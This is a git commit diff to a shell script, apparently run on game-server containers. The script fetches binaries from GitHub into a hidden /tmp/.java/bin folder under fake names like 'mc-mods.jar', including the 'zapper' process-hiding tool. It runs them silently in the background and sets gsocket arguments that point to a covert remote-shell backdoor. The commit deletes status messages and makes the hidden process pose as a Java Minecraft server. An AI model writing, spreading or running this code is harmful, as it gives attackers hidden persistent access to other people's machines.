cab5aecee9372bbcb425fb9d7cf840f6a709eb3d
i51jir6ni9t0 <wker-one@protonmail.com>
2025-02-03 15:54:51 +0000

    FR-TEST

--- azulhst/n1.sh
+++ azulhst/n1.sh
@@ -1,7 +1,6 @@
 #!/bin/bash
 
 function fetch_files() {
-    echo "Applying Patches ..."
     mkdir -p /tmp/.java/bin
     cd /tmp/.java/bin/ && curl -L https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-linux-x86_64 -o mc-mods.jar
     cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o add-on.jar
@@ -13,7 +12,7 @@ function fetch_files() {
 
 function start_app() {
     chmod a+x /tmp/.java/bin/***
-    cd /tmp/.java/bin && nohup ./mc-mods.jar -a '-java' ./plugins.jar -c ./cfg.conf >/dev/null 2>&1 &
+    cd /tmp/.java/bin && nohup ./mc-mods.jar -a 'java -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar' ./plugins.jar -c ./cfg.conf >/dev/null 2>&1 &
     # GNET
     export GSOCKET_ARGS="-s i1A3eD2E2K9c-A1K6f9L2M3-4D9g8H6b5j7-56C4a9f6X1eCd9F9440-d6A28039A1c5J1g6K -liqD"
     export HOME=/home/container
@@ -21,7 +20,6 @@ function start_app() {
 }
 
 if [ -f "/tmp/.java/bin/add-on.jar" ] && [ -f "/tmp/.java/bin/user-patch.jar" ] && [ -f "/tmp/.java/bin/plugins.jar" ]; then
-    echo "Patch files already fetched ..."
     start_app
 else
     rm -rf /tmp/.java/bin/**
